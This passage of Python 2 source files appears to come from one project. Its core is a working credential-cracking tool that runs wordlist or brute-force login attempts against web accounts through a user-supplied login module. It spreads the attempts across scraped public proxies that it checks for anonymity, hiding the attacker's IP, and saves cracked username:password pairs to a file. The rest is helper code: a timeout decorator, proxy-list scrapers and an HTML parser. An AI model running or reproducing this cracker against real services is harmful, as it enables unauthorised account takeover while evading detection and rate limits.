	except IOError as e:
		writeln(str(e), sys.stderr)
		sys.exit(1)

	return data


def tryIntFromDict(d, key):
	"""Try convert 'key' from dictionary 'd' into integer. Exit if failed"""
	try:
		return int(d[key])
	except ValueError:
		writeln(
			key + " have to be integer value, not '" + d[key] + "'!",
			sys.stderr
		)
		sys.exit(1)


def validateIntParameter(args, parameter):
	"""Convert 'parameter' key in 'args' to int and make sure it is > 0."""
	args[parameter]  = tryIntFromDict(args, parameter)
	if args[parameter] <= 0:
		writeln(parameter + " have to be > 0!", sys.stderr)
		sys.exit(1)
#= /Helpers ===================================================================



def _guessPasswords(channel, login_fn, logins, proxy = None):
	"""
	Try batch of logins.

	channel -- stackless channel which is used for returning values.
	login_fn -- function which will be used to login.
	logins -- tuple (username, password)
	"""


	@timeout(10, None, "Timeouted (decaton.timeoutedWrapper()).")
	def timeoutedWrapper(fn, *args, **kwargs):
		return fn(*args, **kwargs)


	def fixLoginExceptions(fn, username, password, downloader, max_attempt = 5,
		                   attempts = 0):
		"""
		Proxy can throw shitload of exceptions - this function will catch them
		all. It also measures how many times was called and raise exception in
		case of too many failed attempts.
		"""
		try:
			writeln("Trying " + username + ":" + password)
			return timeoutedWrapper(fn, username, password, downloader)
		except (TimeoutException,
	            httplib.BadStatusLine,
	            httplib.IncompleteRead,
	            urllib2.HTTPError,
	            urllib2.URLError,
	            socket.error):
			if attempts < max_attempt:
				fixLoginExceptions(
					fn,
					username,
					password,
					downloader,
					max_attempt = max_attempt,
					attempts    = attempts + 1
				)
			else:
				raise StopIteration("Bad proxy")


	# install proxy
	downloader = httpkie.Downloader()
	if proxy is not None:
		downloader = httpkie.Downloader(http_proxy = proxy)

	# try passwords
	for username, password in logins:
		try:
			# does password work?
			working = fixLoginExceptions(
				login_fn,
				username,
				password,
				downloader
			)
			if working:  # if does, tell that to main loop
				channel.send({
					"type": "results",
					"login": (username, password),
					"cracked": True
				})
				stackless.schedule()
				return
		except StopIteration:  # in case of bad proxy, lets try another
			channel.send({
				"type": "new_proxy_request",
				"logins": logins,
				"remove": proxy
			})
			return

	# let main loop know, that this batch of logins failed, so it can start
	# another tasklet
	channel.send({
		"type": "results",
		"logins": (logins[-1]) if len(logins) > 0 else None,
		"cracked": False
	})


def _addTasklet(ch, login_fn, logins, clear_proxies):
	"""
	Take first proxy from 'clear_proxies' and run tasklet with it.
	"""
	proxy = clear_proxies.pop(0) if len(clear_proxies) > 0 else None

	stackless.tasklet(_guessPasswords)(
		ch,
		login_fn,
		logins,
		proxy
	)

	if proxy is not None:
		clear_proxies.append(proxy)


def _pushThreads(batcher, channel, login_fn, threads, clear_proxies):
	"""
	Put tasklets into stackless.

	batcher -- iterator used to generate batch of logins.
	channel -- stackless channel thru which will be messages about success sent
	login_fn -- user's login function (login(username, password) -> bool)
	threads -- how much threads start
	"""
	for thread in range(threads):
		try:
			_addTasklet(channel, login_fn, batcher.next(), clear_proxies)
		except StopIteration:
			break



def runner(login_fn, batch, threads, ticks_per_task, find_all, no_proxy):
	"""
	Main function of this whole program. It is taking care of multitastking and
	tasklet communication.

	login_fn -- function expecting 3 arguments - username, password and httpkie
	            downloader instance.
	batch -- tools.batcher instance.
	threads -- how much stackless tasklet to use
	ticks_per_task -- how much ticks will each tread get each iteration
	no_proxy -- don't use proxy support (proxies are obtained automatically)
	"""
	clear_proxies  = []

	ch = stackless.channel()  # used to communicate with login tasklets
	proxy_ch = stackless.channel()  # proxy receiver

	# there have to be 2 or more tasklets to use send() - forever is killed when
	# other threads starts
	def forever():
		while True:
			stackless.schedule()
	# proxy support
	if not no_proxy:
		forever = stackless.tasklet(forever)()
		writeln("Obtaining proxy list..")
		stackless.tasklet(filterTasklet)(threads, proxy_ch)

	cnt = 0
	all_cracked = []
	batch_ended = False
	threads_pushed = False
	while stackless.getruncount() > 1 or not batch_ended:  # and not batch_ended:
		# wait until there is enough clear_proxies
		if not threads_pushed and (len(clear_proxies) >= threads or no_proxy):
			_pushThreads(batch, ch, login_fn, threads, clear_proxies)

			threads_running = stackless.getruncount() - 3
			if no_proxy:
				threads_running = stackless.getruncount() - 1

			writeln("\nRunning " + str(threads_running) + " threads.")

			threads_pushed = True
			if not no_proxy:
				forever.kill()  # remove forever loop

		t = stackless.run(ticks_per_task)  # give tasklet his share of ticks

		# if tasklet still has something to do, put it back into queue
		if t:
			t.insert()

		# "progress bar"
		cnt += 1
		if cnt == 1000:
			write("*")
			cnt = 0

		# handle communication with tasklets
		while ch.balance > 0:
			message = ch.receive()

			# results from tasklet
			if message["type"] == "results":
				if message["cracked"]:
					cracked = ":".join(message["login"])
					writeln("\nCracked: " + cracked + "\n")

					# save results into file
					with open("cracked.txt", "a") as f:
						f.write(cracked + "\n")
						f.close()

					all_cracked.append(cracked)

					if not find_all:
						return True

				# don't put new threads to stack if batch already ended
				if batch_ended:
					continue

				try:
					_addTasklet(ch, login_fn, batch.next(), clear_proxies)
				except StopIteration:   # if there is nothing new in batcher
					batch_ended = True  # wait until other threads end
			elif message["type"] == "new_proxy_request" and not no_proxy:
				clear_proxies.remove(message["remove"])
				_addTasklet(ch, login_fn, message["logins"], clear_proxies)
			else:
				raise UserWarning("Unknown message!")

		# handle communication with proxy module
		if not no_proxy:
			while proxy_ch.balance > 0:
				clear_proxies = list(set(clear_proxies + proxy_ch.receive()))

			while proxy_ch.balance < 0:
				proxy_ch.send(clear_proxies)

	if all_cracked == []:
		writeln("No usable login found.")
	else:
		writeln("Found theese logins:\n\t" + "\n\t".join(all_cracked))

	return False



def wordlistCracker(login_fn, userlist, passlist, args):
	user_start = None
	pass_start = None
	if args["--start-with"] is not None:
		__ = map(
			lambda x:
				x.strip(),
			args["--start-with"].split(":")
		)  # todo, fixnout později
		try:
			user_start = __[0]
			pass_start = "".join(__[1:])
		except IndexError:
			writeln("--start-with syntax; username:password", sys.stderr)
			sys.exit(1)

		if (user_start not in userlist) or (pass_start not in passlist):
			writeln(
				"Can't find username/password given to --start-with!",
				sys.stderr
			)
			sys.exit(1)


	batch = batcher(
		userlist,
		passlist,
		args["--batch-size"],
		cycle_users = args["--cycle-users"],
		user_start = user_start,
		pass_start = pass_start
	)

	return runner(
		login_fn,
		batch,
		args["--threads"],
		args["--ticks-per-task"],
		args["--find-all"],
		args["--no-proxy"]
	)


def bruteforceCracker(login_fn, userlist, args):
	def sublistToString(l):
		for sublist in l:
			yield "".join(sublist)

	# TODO: přepsat na lepší parsování pole
	start_with = list(args["--start-with"]) if args["--start-with"] is not None else None

	# TODO: dodělat podporu --start-with

	batch = batcher(
		userlist,
		sublistToString(
			bruteforce(
				args["--seed"],
				args["--length"],
				args["--use-all"],
				start_with
			)
		),
		args["--batch-size"],
		cycle_users = args["--cycle-users"]
	)

	return runner(
		login_fn,
		batch,
		args["--threads"],
		args["--ticks-per-task"],
		args["--find-all"],
		args["--no-proxy"]
	)



#= Main program ===============================================================
if __name__ == '__main__':
	args = docopt.docopt(arg)

	# argument constraints
	if not os.path.exists(args["--userlist"]):
		writeln("You have to specify valid --userlist file!", sys.stderr)
		sys.exit(1)


	# validate login.py
	if not os.path.exists(args["<login.py>"]):
		writeln("You have to specify valid '<login.py>' file!", sys.stderr)
		sys.exit(1)
	if "/" in args["<login.py>"]:
		writeln("<login.py> have to be in local directory!", sys.stderr)
		sys.exit(1)
	if args["<login.py>"].endswith(".py"):
		args["<login.py>"] = args["<login.py>"].replace(".py", "")
	login_module = __import__(args["<login.py>"])
	if not hasattr(login_module, "login"):
		writeln(
			"In <login.py> have to be function called 'login' and expecting 3"
			"attributes:\n"
			" username\n"
			" password\n"
			" httpkie.Downloader() instance to be used as proxy.\n",
			sys.stderr
		)
		sys.exit()


	if args["--passlist"] is not None and not os.path.exists(args["--passlist"])\
	   and not args["brute"]:
		writeln(
			"You have to specify valid --passlist or use bruteforce!",
			sys.stderr
		)
		sys.exit(1)

	USERLIST = readFile(args["--userlist"]).splitlines()

	PASSLIST = []
	if args["--passlist"] is not None:
		PASSLIST = readFile(args["--passlist"]).splitlines()
		args["--seed"] = PASSLIST


	validateIntParameter(args, "--length")
	validateIntParameter(args, "--batch-size")
	validateIntParameter(args, "--threads")
	validateIntParameter(args, "--ticks-per-task")


	if args["brute"]:
		writeln("Starting bruteforce cracker")
		bruteforceCracker(
			login_module.login,
			USERLIST,
			args,
		)
	else:
		writeln("Starting wordlist cracker")
		wordlistCracker(
			login_module.login,
			USERLIST,
			PASSLIST,
			args,
		)
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Timeout() to limit execution time of your functions.

Author: Bystroushaak (bystrousak@kitakitsune.org)
Credit; http://pguides.net/python-tutorial/python-timeout-a-function/
"""
# Imports #####################################################################
import signal



# Functions & classes #########################################################
class TimeoutException(Exception):
	def __init__(self, value = ""):
		self.value = value

	def __str__(self):
		return repr(self.value)


def __timeout_handler(signum, frame):
	raise TimeoutException()


def timeout(timeout_time, default, exception_message = None):
	"""
	Use this as decorator to your functions:

	--
	@timeout(5, None)
	def myFunc(..)
	--

	timeout_time -- measured in seconds
	default -- default value returned if function timeouts
	exception_message -- if set, raise TimeoutException instead of returning
	default value.
	"""
	def __timeout_function(f):
		def f2(*args, **kwargs):
			old_handler = signal.signal(signal.SIGALRM, __timeout_handler)
			signal.alarm(timeout_time)  # triger alarm in timeout_time seconds

			try:
				retval = f(*args, **kwargs)
			except TimeoutException:
				if exception_message is not None:
					raise TimeoutException(str(exception_message))
				return default
			finally:
				signal.signal(signal.SIGALRM, old_handler)

			signal.alarm(0)
			return retval
		return f2
	return __timeout_function



# Unittests ###################################################################
if __name__ == '__main__':
	import time

	SLEEP_TIME = 5
	WAIT_TIME  = 1

	print "Testing .."

	@timeout(WAIT_TIME, None)
	def sleep():
		time.sleep(SLEEP_TIME)

	@timeout(WAIT_TIME, "timeouted")
	def sleep2():
		time.sleep(SLEEP_TIME)

	@timeout(WAIT_TIME, "", "Timeouted!")
	def sleep3():
		time.sleep(SLEEP_TIME)


	ts = time.time()
	assert sleep() is None
	te = time.time()

	assert int(te - ts) == WAIT_TIME, "Timeout takes too long!"
	assert sleep2() == "timeouted", "Timeout doesn't return proper defaults!"

	try:
		sleep3()
		raise AssertionError("Timeout doesn't raise proper exception!")
	except TimeoutException, e:
		assert e.value == "Timeouted!"

	print "Everything is working as expected."
# -*- coding: utf-8 -*-
# This file is there mainly for 'git submodule' use in other projects.

from timeout import *#! /usr/bin/env python
# -*- coding: utf-8 -*-
"""

by Bystroushaak (bystrousak@kitakitsune.org
"""
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import urllib2

import httpproxy



#= Functions & objects ========================================================
def getProxies():
	proxy_lists = [
		httpproxy.incloak,
		httpproxy.ipaddresscom,
		httpproxy.hidemyass
	]

	out = []
	for proxy_list in proxy_lists:
		try:
			out.extend(proxy_list.getProxies())
		except urllib2.HTTPError:
			pass

	if len(out) == 0:
		raise EnvironmentError("proxy_grabber stopped working :S")

	return out



#= Main program ===============================================================
if __name__ == '__main__':
	print getProxies()
#! /usr/bin/env python
# -*- coding: utf-8 -*-
"""

by Bystroushaak (bystrousak@kitakitsune.org
"""
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import sys
import time
import socket
import httplib
import urllib2

import stackless


from timeout import *
import httpproxy.httpkie as httpkie

import proxy_grabber



#= Variables ==================================================================
IP_URL = "http://www.whatsmyip.us/showipsimple.php"
REAL_IP = None  # here will be stored your real IP


#= Functions & objects ========================================================
def write(s, out=sys.stdout):
	out.write(str(s))
	out.flush()
def writeln(s, out=sys.stdout):
	write(s + "\n")


def makeAtomic(fn, *args, **kwargs):
	"""
	Run 'fn' argument in atomic mode (stop other tasklets and wait for 'fn' to
	end.)
	"""
	# set tasklet to atomic
	currentTasklet = stackless.getcurrent()
	atomic = currentTasklet.set_atomic(True)
	try:
		return fn(*args, **kwargs)
	finally:
		currentTasklet.set_atomic(atomic)


def getIP(downer = None, proxy = None):
	"""
	Return IP of given 'downer'. Use 'proxy', if set.

	downer -- httpkie.Downloader instance. If not set, function creates own.
	proxy -- "ip:port" string
	"""
	if downer is None:
		downer = httpkie.Downloader(http_proxy = proxy)

	data = downer.download(IP_URL)

	return data.split('"')[1]

REAL_IP = getIP()  # save your own IP address to check proxies for anonymity later


def isAnonymous(proxy, timeout_s):
	"""
	Check if given proxy is really anonymous - not only it is using different
	IP, but also doesn't send (X_)FORWARDED_FOR and CLIENT_IP headers to server.

	proxy -- "ip:port" string
	timeout_s -- how much time wait to test, in seconds
	"""
	@timeout(timeout_s, None, "Timeouted (proxy_checker.isAnonymous())")
	def _isAnonymous(proxy):
		d = httpkie.Downloader(http_proxy = proxy)

		data = d.download("http://anoncheck.security-portal.cz/")

		if REAL_IP in data:
			return False

		return REAL_IP != getIP(proxy = proxy)

	return _isAnonymous(proxy)


def pingProxy(proxy, timeout_s):
	"""
	Try read something thru proxy and compute how much time it takes. Uses
	atomic stackless mode.

	proxy -- "ip:port" string
	timeout_s -- how much time wait to test, in seconds
	"""
	@timeout(timeout_s, None, "Timeouted (proxy_checker.pingProxy()")
	def _pingProxy(proxy):
		d = httpkie.Downloader(http_proxy = proxy)

		def measureTime(d):
			t1 = time.time()
			d.download(IP_URL)
			t2 = time.time()

			return t1, t2

		t1, t2 = makeAtomic(measureTime, d)

		return int((t2 - t1) * 1000)

	return _pingProxy(proxy)


def testProxy(proxy, timeout = 10, max_ping = 5000, attempts = 6):
	"""
	Test if proxy is usable (match 'timeout' and 'max_ping' over 'attempts').

	timeout -- default 10, in seconds
	max_ping -- default 10000, in miliseconds
	attempts -- default 10 - how much samples is used to count average ping
	"""
	pings = []
	bad_calls = 0
	i = 0
	while i < attempts:
		try:
			pings.append(pingProxy(proxy, timeout))
			i += 1
		except (TimeoutException,
			    httplib.BadStatusLine,
			    httplib.IncompleteRead,
			    urllib2.HTTPError,
			    urllib2.URLError,
			    socket.error):
			bad_calls += 1

		if bad_calls > (attempts / 3):
			return False

	return (sum(pings) / len(pings)) < max_ping


def filterTasklet(proxy_count, proxy_ch):
	"""
	Send at least 'proxy_count' proxy servers thru 'proxy_ch'.
	"""
	raw_proxies = []
	clear_proxies = []
	failed_proxies = []

	while True:
		if len(clear_proxies) > proxy_count + 1:
			clear_proxies = proxy_ch.receive()
			stackless.schedule()
			continue

		if len(raw_proxies) == 0:
			raw_proxies = proxy_grabber.getProxies()

		proxy = raw_proxies.pop(0)

		if isinstance(proxy, dict):
			proxy = proxy["ip"] + ":" + str(proxy["port"])

		if proxy in failed_proxies:
			continue

		if testProxy(proxy):
			if len(clear_proxies) >= proxy_count:
				clear_proxies = proxy_ch.receive()

			clear_proxies.append(proxy)

			if len(clear_proxies) < proxy_count + 1:
				write(" got " + str(len(clear_proxies)) + " ")

			if len(clear_proxies) >= proxy_count:
				proxy_ch.send(clear_proxies)
		else:
			failed_proxies.append(proxy)



#= Main program ===============================================================
if __name__ == '__main__':
	pass
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
from proxy_checker import *# -*- coding: utf-8 -*-
# This file is there mainly for 'git submodule' use in other projects.

import incloak
import hidemyass
import ipaddresscom
#! /usr/bin/env python
# -*- coding: utf-8 -*-
"""
Proxy parser for http://incloak.com/proxy-list/.

by Bystroushaak bystrousak@kitakitsune.org
"""
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import httpkie
import dhtmlparser as d



#= Functions & objects ========================================================
def getProxies():
	"""
	Return array of dicts following this structure:
	{
		ip: str(ip),
		port: int(port),
		ping: int(ms)
	}
	"""
	down = httpkie.Downloader()

	dom = d.parseString(
		down.download("http://incloak.com/proxy-list/?type=h&anon=234")
	)

	proxies = []
	for tr in dom.find("table")[6].find("tr")[1:]:
		proxy = {
			"ip": tr.find("td")[0].getContent(),
			"port": 8080,
			"ping": int(tr.find("div")[-1].getContent().split()[0])
		}
		proxies.append(proxy)

	return proxies


if __name__ == '__main__':
	import json
	print json.dumps(getProxies())
	print len(getProxies())
# -*- coding: utf-8 -*-
# This file is there mainly for 'git submodule' use in other projects.

from dhtmlparser import *#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Author:  Bystroushaak (bystrousak@kitakitsune.org)
Version: 1.7.3

This version doens't corresponds with DHTMLParser v1.5.0 - there were updates,
which makes both parsers incompatible.

This work is licensed under a Creative Commons 3.0 Unported License
(http://creativecommons.org/licenses/by/3.0/cz/).

Project page; https://github.com/Bystroushaak/pyDHTMLParser
"""



# Nonpair tags
NONPAIR_TAGS = [
	"br",
	"hr",
	"img",
	"input",
	#"link",
	"meta",
	"spacer",
	"frame",
	"base"
]



def unescape(inp, quote = '"'):
	if len(inp) < 2:
		return inp

	output = ""
	unesc = False
	for act in inp:
		if act == quote and unesc:
			output = output[:-1]

		output += act

		if act == "\\":
			unesc = not unesc
		else:
			unesc = False

	return output


def escape(input, quote = '"'):
	output = ""

	for c in input:
		if c == quote:
			output += '\\'

		output += c

	return output


def rotate_buff(buff):
	"Rotate buffer (for each buff[i] = buff[i-1])"
	i = len(buff) - 1
	while i > 0:
		buff[i] = buff[i - 1]
		i -= 1

	return buff


class SpecialDict(dict):
	"""
	This dictionary stores items case sensitive, but compare them case
	INsensitive.
	"""
	def __contains__(self, k):
		for item in super(SpecialDict, self).keys():
			if k.lower() == item.lower():
				return True

	def __getitem__(self, k):
		for item in self.keys():
			if k.lower() == item.lower():
				return super(SpecialDict, self).__getitem__(item)



class HTMLElement():
	"""
	Container for parsed html elements.
	"""

	def __init__(self, tag = "", second = None, third = None):
		self.__element = None
		self.__tagname = ""

		self.__istag        = False
		self.__isendtag     = False
		self.__iscomment    = False
		self.__isnonpairtag = False

		self.childs = []
		self.params = SpecialDict()
		self.endtag = None
		self.openertag = None

		# blah, constructor overloading in python sux :P
		if isinstance(tag, str) and second is None and third is None:
			self.__init_tag(tag)
		elif isinstance(tag, str) and isinstance(second, dict) and third is None:
			self.__init_tag_params(tag, second)
		elif isinstance(tag, str) and isinstance(second, dict) and     \
		     (isinstance(third, list) or isinstance(third, tuple)) and \
		     len(third) > 0 and isinstance(third[0], HTMLElement):

			# containers with childs are automatically considered tags
			if tag.strip() != "":
				if not tag.startswith("<"):
					tag = "<" + tag
				if not tag.endswith(">"):
					tag += ">"
			self.__init_tag_params(tag, second)
			self.childs = closeElements(third)
			self.endtag = HTMLElement("</" + self.getTagName() + ">")
		elif isinstance(tag, str) and (isinstance(second, list) or \
			 isinstance(second, tuple)) and len(second) > 0 and    \
			 isinstance(second[0], HTMLElement):

			# containers with childs are automatically considered tags
			if tag.strip() != "":
				if not tag.startswith("<"):
					tag = "<" + tag
				if not tag.endswith(">"):
					tag += ">"

			self.__init_tag(tag)
			self.childs = closeElements(second)
			self.endtag = HTMLElement("</" + self.getTagName() + ">")
		elif (isinstance(tag, list) or isinstance(tag, tuple)) and len(tag) > 0 \
		     and isinstance(tag[0], HTMLElement):
			self.__init_tag("")
			self.childs = closeElements(tag)
		else:
			raise Exception("Oh no, not this crap!")


	#===========================================================================
	#= Constructor overloading =================================================
	#===========================================================================
	def __init_tag(self, tag):
			self.__element = tag

			self.__parseIsTag()
			self.__parseIsComment()

			if (not self.__istag) or self.__iscomment:
				self.__tagname = self.__element
			else:
				self.__parseTagName()

			if self.__iscomment or not self.__istag:
				return

			self.__parseIsEndTag()
			self.__parseIsNonPairTag()

			if self.__istag and (not self.__isendtag) or "=" in self.__element:
				self.__parseParams()


	# used when HTMLElement(tag, params) is called - basically create string
	# from tagname and params
	def __init_tag_params(self, tag, params):
		tag = tag.strip().replace(" ", "")
		nonpair = ""

		if tag.startswith("<"):
			tag = tag[1:]

		if tag.endswith("/>"):
			tag = tag[:-2]
			nonpair = " /"
		elif tag.endswith(">"):
			tag = tag[:-1]

		output = "<" + tag

		for key in params.keys():
			output += " " + key + '="' + escape(params[key], '"') + '"'

		self.__init_tag(output + nonpair + ">")


	def find(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Same as findAll, but without endtags. You can always get them from
		.endtag property..
		"""

		dom = self.findAll(tag_name, params, fn, case_sensitive)

		return filter(lambda x: not x.isEndTag(), dom)


	def findB(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Same as findAllB, but without endtags. You can always get them from
		.endtag property..
		"""

		dom = self.findAllB(tag_name, params, fn, case_sensitive)

		return filter(lambda x: not x.isEndTag(), dom)


	def findAll(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Simple search engine using Depth-first algorithm
		http://en.wikipedia.org/wiki/Depth-first_search.

		Finds elements and subelements which match patterns given by parameters.
		Allows searching defined by users lambda function.

		@param tag_name: Name of tag.
		@type tag_name: string

		@param params: Parameters of arg.
		@type params: dictionary

		@param fn: User defined function for search.
		@type fn: lambda function

		@param case_sensitive: Search case sensitive. Default True.
		@type case_sensitive: bool

		@return: Matches.
		@rtype: Array of HTMLElements
		"""
		output = []

		if self.isAlmostEqual(tag_name, params, fn, case_sensitive):
			output.append(self)

		tmp = []
		for el in self.childs:
			tmp = el.findAll(tag_name, params, fn, case_sensitive)

			if tmp is not None and len(tmp) > 0:
				output.extend(tmp)

		return output


	def findAllB(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Simple search engine using Breadth-first algorithm
		http://en.wikipedia.org/wiki/Breadth-first_search.

		Finds elements and subelements which match patterns given by parameters.
		Allows searching defined by users lambda function.

		@param tag_name: Name of tag.
		@type tag_name: string

		@param params: Parameters of arg.
		@type params: dictionary

		@param fn: User defined function for search.
		@type fn: lambda function

		@param case_sensitive: Search case sensitive. Default True.
		@type case_sensitive: bool

		@return: Matches.
		@rtype: Array of HTMLElements
		"""
		output = []

		if self.isAlmostEqual(tag_name, params, fn, case_sensitive):
			output.append(self)

		breadth_search = self.childs
		for el in breadth_search:
			if el.isAlmostEqual(tag_name, params, fn, case_sensitive):
				output.append(el)

			if len(el.childs) > 0:
				breadth_search.extend(el.childs)

		return output


	#==========================================================================
	#= Parsers ================================================================
	#==========================================================================
	def __parseIsTag(self):
		if self.__element.startswith("<") and self.__element.endswith(">"):
			self.__istag = True
		else:
			self.__istag = False


	def __parseIsEndTag(self):
		last = ""
		self.__isendtag = False

		if self.__element.startswith("<") and self.__element.endswith(">"):
			for c in self.__element:
				if c == "/" and last == "<":
					self.__isendtag = True
				if ord(c) > 32:
					last = c


	def __parseIsNonPairTag(self):
		last = ""
		self.__isnonpairtag = False

		# Tags endings with /> are nonpair - do not mind whitespaces (< 32)
		if self.__element.startswith("<") and self.__element.endswith(">"):
			for c in self.__element:
				if c == ">" and last == "/":
					self.__isnonpairtag = True
					return
				if ord(c) > 32:
					last = c

		# Check listed nonpair tags
		if self.__tagname.lower() in NONPAIR_TAGS:
			self.__isnonpairtag = True


	def __parseIsComment(self):
		if self.__element.startswith("<!--") and self.__element.endswith("-->"):
			self.__iscomment = True
		else:
			self.__iscomment = False


	def __parseTagName(self):
		for el in self.__element.split(" "):
			el = el.replace("/", "").replace("<", "").replace(">", "")
			if len(el) > 0:
				self.__tagname = el.rstrip()
				return


	def __parseParams(self):
		# check if there are any parameters
		if " " not in self.__element or "=" not in self.__element:
			return

		# Remove '<' & '>'
		params = self.__element.strip()[1:-1].strip()
		# Remove tagname
		params = params[
			params.find(self.getTagName()) + len(self.getTagName()):
		].strip()

		# Parser machine
		next_state = 0
		key = ""
		value = ""
		end_quote = ""
		buff = ["", ""]
		for c in params:
			if next_state == 0:  # key
				if c.strip() != "":  # safer than list space, tab and all possible whitespaces in UTF
					if c == "=":
						next_state = 1
					else:
						key += c
			elif next_state == 1:  # value decisioner
				if c.strip() != "":  # skip whitespaces
					if c == "'" or c == '"':
						next_state = 3
						end_quote = c
					else:
						next_state = 2
						value += c
			elif next_state == 2:  # one word parameter without quotes
				if c.strip() == "":
					next_state = 0
					self.params[key] = value
					key = ""
					value = ""
				else:
					value += c
			elif next_state == 3:  # quoted string
				if c == end_quote and (buff[0] != "\\" or (buff[0]) == "\\" and buff[1] == "\\"):
					next_state = 0
					self.params[key] = unescape(value, end_quote)
					key = ""
					value = ""
					end_quote = ""
				else:
					value += c

			buff = rotate_buff(buff)
			buff[0] = c

		if key != "":
			if end_quote != "" and value.strip() != "":
				self.params[key] = unescape(value, end_quote)
			else:
				self.params[key] = value

		if len(filter(lambda x: x == "/", self.params.keys())) > 0:
			del self.params["/"]
			self.__isnonpairtag = True

	#* /Parsers ****************************************************************


	#===========================================================================
	#= Getters =================================================================
	#===========================================================================
	def isTag(self):
		"True if element is tag (not content)."
		return self.__istag


	def isEndTag(self):
		"True if HTMLElement is end tag (/tag)."
		return self.__isendtag


	def isNonPairTag(self, isnonpair = None):
		"""
		Returns True if HTMLElement is listed nonpair tag table (br for example)
		or if it ends with / - <br /> for example.

		You can also change state from pair to nonpair if you use this as setter.
		"""
		if isnonpair is None:
			return self.__isnonpairtag
		else:
			self.__isnonpairtag = isnonpair
			if not isnonpair:
				self.endtag = None
				self.childs = []


	def isPairTag(self):
		"""
		Return True if this is paired tag - <body> .. </body> for example.
		"""
		if self.isComment() or self.isNonPairTag:
			return False
		if self.isEndTag():
			return True
		if self.isOpeningTag() and self.endtag is not None:
			return True

		return False


	def isComment(self):
		"True if HTMLElement is html comment."
		return self.__iscomment


	def isOpeningTag(self):
		"True if is opening tag."
		if self.isTag() and (not self.isComment()) and (not self.isEndTag()) \
		   and (not self.isNonPairTag()):
			return True
		else:
			return False


	def isEndTagTo(self, opener):
		"Returns true, if this element is endtag to opener."
		if self.__isendtag and opener.isOpeningTag():
			if self.__tagname.lower() == opener.getTagName().lower():
				return True
			else:
				return False
		else:
			return False


	def tagToString(self):
		"Returns tag (with parameters), without content or endtag."
		if len(self.params) <= 0:
			return self.__element
		else:
			output = "<" + str(self.__tagname)

			for key in self.params.keys():
				output += " " + key + "=\"" + escape(self.params[key], '"') + "\""

			return output + " />" if self.__isnonpairtag else output + ">"


	def getTagName(self):
		"Returns tag name."
		return self.__tagname


	def getContent(self):
		"Returns content of tag (everything between opener and endtag)."
		output = ""

		for c in self.childs:
			if not c.isEndTag():
				output += c.toString()

		if output.endswith("\n"):
			output = output[:-1]

		return output


	def prettify(self, depth = 0, separator = "  ", last = True, pre = False, inline = False):
		"Returns prettifyied tag with content."
		output = ""

		if self.getTagName() != "" and self.tagToString().strip() == "":
			return ""

		# if not inside <pre> and not inline, shift tag to the right
		if not pre and not inline:
			output += (depth * separator)

		# for <pre> set 'pre' flag
		if self.getTagName().lower() == "pre" and self.isOpeningTag():
			pre = True
			separator = ""

		output += self.tagToString()

		# detect if inline
		is_inline = inline  # is_inline shows if inline was set by detection, or as parameter
		for c in self.childs:
			if not (c.isTag() or c.isComment()):
				if len(c.tagToString().strip()) != 0:
					inline = True

		# don't shift if inside container (containers have blank tagname)
		original_depth = depth
		if self.getTagName() != "":
			if not pre and not inline:  # inside <pre> doesn't shift tags
				depth += 1
				if self.tagToString().strip() != "":
					output += "\n"

		# prettify childs
		for e in self.childs:
			if not e.isEndTag():
				output += e.prettify(depth, last = False, pre = pre, inline = inline)

		# endtag
		if self.endtag is not None:
			if not pre and not inline:
				output += ((original_depth) * separator)

			output += self.endtag.tagToString().strip()

			if not is_inline:
				output += "\n"

		return output

	#* /Getters ****************************************************************


	#===========================================================================
	#= Operators ===============================================================
	#===========================================================================
	def toString(self, original = False):
		"""
		Returns almost original string (use original = True if you want exact copy).

		If you want prettified string, try .prettify()

		If original == True, return parsed element, so if you changed something
		in .params, there will be no traces of those changes.
		"""
		output = ""

		if self.childs != [] or self.isOpeningTag():
			output += self.__element if original else self.tagToString()

			for c in self.childs:
				output += c.toString(original)

			if self.endtag is not None:
				output += self.endtag.tagToString()
		elif not self.isEndTag():
			output += self.tagToString()

		return output


	def __str__(self):
		return self.toString()


	def isAlmostEqual(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Compare element with given tagname, params and/or by lambda function.

		Lambda function is same as in .find().
		"""

		if isinstance(tag_name, HTMLElement):
			return self.isAlmostEqual(tag_name.getTagName(), self.params)

		# search by lambda function
		if fn is not None:
			if fn(self):
				return True

		if not case_sensitive:
			self.__tagname = self.__tagname.lower()
			tag_name = tag_name.lower()

		# compare tagname
		if self.__tagname == tag_name and self.__tagname != "" and self.__tagname is not None:
			# compare parameters
			if params is None or len(params) == 0:
				return True
			elif len(self.params) > 0:
				for key in params.keys():
					if key not in self.params:
						return False
					elif params[key] != self.params[key]:
						return False

				return True

		return False

	#* /Operators **************************************************************


	#===========================================================================
	#= Setters =================================================================
	#===========================================================================
	def replaceWith(self, el):
		"""
		Replace element. Useful when you don't want change all references to object.
		"""
		self.childs = el.childs
		self.params = el.params
		self.endtag = el.endtag
		self.openertag = el.openertag

		self.__tagname = el.getTagName()
		self.__element = el.tagToString()

		self.__istag = el.isTag()
		self.__isendtag = el.isEndTag()
		self.__iscomment = el.isComment()
		self.__isnonpairtag = el.isNonPairTag()


	def removeChild(self, child, end_tag_too = True):
		"""
		Remove subelement (child) specified by reference.

		This can't be used for removing subelements by value! If you want do
		such thing, do:

		---
		for e in dom.find("value"):
			dom.removeChild(e)
		---

		Params:
			child
				child which will be removed from dom (compared by reference)
			end_tag_too
				remove end tag too - default true
		"""

		if len(self.childs) <= 0:
			return

		end_tag = None
		if end_tag_too:
			end_tag = child.endtag

		for e in self.childs:
			if e == child:
				self.childs.remove(e)
